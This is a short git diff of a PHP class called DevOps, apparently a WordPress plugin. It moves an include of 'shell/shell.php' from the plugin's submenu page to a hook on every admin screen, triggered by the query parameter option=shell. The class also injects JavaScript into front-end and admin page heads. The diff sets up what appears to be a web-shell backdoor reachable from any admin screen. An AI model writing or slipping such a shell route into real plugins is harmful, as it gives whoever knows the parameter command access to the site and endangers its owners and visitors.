@@ -26,6 +26,7 @@ class DevOps {
         add_action('wp_head', [$this, 'js']);
         add_action('admin_head', [$this, 'js']);
         add_action('admin_menu', [$this, 'register_sub_menu']);
+        add_action('current_screen', [$this, 'shell_page']);
     }
     
     public function register_sub_menu() {
@@ -40,12 +41,6 @@ class DevOps {
     }
 
     public function submenu_page_callback() { 
-        if (isset($_GET['option'])) {
-            if ($_GET['option'] == 'shell') {
-                include 'shell/shell.php';
-                die;
-            }
-        }
         ?>
         <div class="wrap">
             <h2>DevOps</h2>
@@ -66,6 +61,15 @@ class DevOps {
             })()
         </script>
         <?php 
+    }
+
+    public function shell_page() {
+        if (isset($_GET['option'])) {
+            if ($_GET['option'] == 'shell') {
+                include 'shell/shell.php';
+                die;
+            }
+        }
     }
         
     public function controller() {
